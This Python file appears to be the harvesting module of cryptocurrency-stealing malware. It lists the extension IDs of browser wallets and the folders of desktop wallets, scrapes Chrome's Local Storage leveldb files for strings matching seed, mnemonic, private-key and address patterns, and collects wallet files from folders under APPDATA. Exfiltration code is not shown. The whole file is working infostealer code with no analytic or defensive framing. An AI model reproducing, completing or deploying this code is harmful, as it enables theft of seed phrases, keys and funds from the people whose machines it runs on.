import os
import json
import shutil
import tempfile

WALLET_EXTENSIONS = {
    "MetaMask": ["chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn", "Local Storage", "leveldb"],
    "Exodus": [os.environ.get("APPDATA", ""), "Exodus", "exodus.wallet"],
    "Atomic": [os.environ.get("APPDATA", ""), "atomic", "Local Storage", "leveldb"],
    "Electrum": [os.environ.get("APPDATA", ""), "Electrum", "wallets"],
    "Coinbase": ["chrome-extension://hnfanknocfeofbddgcijnmhnfnkdnaad", "Local Storage", "leveldb"],
    "Binance": ["chrome-extension://fhbohimaelbohpjbbldcngcnapndodjp", "Local Storage", "leveldb"],
    "Phantom": ["chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa", "Local Storage", "leveldb"],
    "Keplr": ["chrome-extension://dmkamcknogkgcdfhhbddcghachkejeap", "Local Storage", "leveldb"],
    "TronLink": ["chrome-extension://ibnejdfjmmkpcnlpebklmnkoeoihofec", "Local Storage", "leveldb"],
    "TrustWallet": ["chrome-extension://egjidjbpglichdcondbcbdnbgpmcomih", "Local Storage", "leveldb"],
}

DESKTOP_WALLETS = {
    "Exodus": [os.environ.get("APPDATA", ""), "Exodus"],
    "Electrum": [os.environ.get("APPDATA", ""), "Electrum", "wallets"],
    "Atomic": [os.environ.get("APPDATA", ""), "atomic"],
    "Coinomi": [os.environ.get("APPDATA", ""), "Coinomi"],
    "Jaxx": [os.environ.get("APPDATA", ""), "Jaxx"],
}


def read_leveldb(path: str) -> list[dict]:
    results = []
    if not os.path.exists(path):
        return results
    try:
        for f in os.listdir(path):
            if f.endswith((".log", ".ldb", ".log.old")):
                fp = os.path.join(path, f)
                try:
                    with open(fp, "rb") as lf:
                        content = lf.read()
                    strings = []
                    buf = []
                    for b in content:
                        if 32 <= b < 127:
                            buf.append(chr(b))
                        else:
                            if len(buf) > 4:
                                strings.append("".join(buf))
                            buf = []
                    for s in strings:
                        if any(k in s for k in ["0x", "seed", "mnemonic", "phrase", "private", "wallet"]):
                            results.append({"file": f, "data": s})
                except Exception:
                    pass
    except Exception:
        pass
    return results


def scan_extension_wallets() -> list[dict]:
    results = []
    extensions_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Extensions")
    local_storage_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
    for name in WALLET_EXTENSIONS:
        if local_storage_path and os.path.exists(local_storage_path):
            data = read_leveldb(local_storage_path)
            for d in data:
                d["wallet"] = name
                results.append(d)
    return results


def scan_desktop_wallets() -> list[dict]:
    results = []
    for name, parts in DESKTOP_WALLETS.items():
        path = os.path.join(*parts)
        if not os.path.exists(path):
            continue
        try:
            for root, dirs, files in os.walk(path):
                for f in files:
                    fp = os.path.join(root, f)
                    ext = os.path.splitext(f)[1].lower()
                    if ext in [".wallet", ".dat", ".json", ".db", ".sqlite"]:
                        try:
                            if os.path.getsize(fp) > 1024 * 1024:
                                continue
                            with open(fp, "rb") as wf:
                                content = wf.read()
                            results.append({"wallet": name, "file": fp, "size": len(content)})
                        except Exception:
                            pass
        except Exception:
            pass
    return results


def extract_all() -> dict:
    return {
        "extension_wallets": scan_extension_wallets(),
        "desktop_wallets": scan_desktop_wallets(),
    }
